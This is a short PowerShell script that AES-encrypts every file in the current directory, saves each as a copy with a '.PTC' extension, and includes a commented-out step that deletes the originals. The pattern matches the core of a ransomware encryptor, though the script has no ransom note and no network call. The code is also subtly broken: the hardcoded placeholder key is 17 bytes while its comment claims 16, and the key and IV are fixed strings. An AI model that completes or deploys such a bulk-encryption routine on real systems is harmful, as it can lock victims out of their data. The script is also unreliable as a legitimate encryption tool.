# Define encryption parameters
$key = [System.Text.Encoding]::UTF8.GetBytes("Your16ByteKeyHere") # 16 bytes key for AES-128
$iv = [System.Text.Encoding]::UTF8.GetBytes("Your16ByteIVHere") # 16 bytes IV for AES

function Encrypt-File {
    param (
        [string]$inputFilePath,
        [string]$outputFilePath
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv

    $encryptor = $aes.CreateEncryptor()

    try {
        $inputStream = [System.IO.File]::OpenRead($inputFilePath)
        $outputStream = [System.IO.File]::OpenWrite($outputFilePath)

        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        $buffer = New-Object byte[] 4096
        $bytesRead = 0
        while (($bytesRead = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cryptoStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.FlushFinalBlock()
    }
    finally {
        $inputStream.Close()
        $cryptoStream.Close()
        $outputStream.Close()
    }
}

# Get all files in the current directory
$files = Get-ChildItem -Path . -File

foreach ($file in $files) {
    $inputFilePath = $file.FullName
    $outputFilePath = "$($file.FullName).PTC"
    
    Encrypt-File -inputFilePath $inputFilePath -outputFilePath $outputFilePath
    
    # Optionally, delete the original file
    # Remove-Item -Path $inputFilePath
}
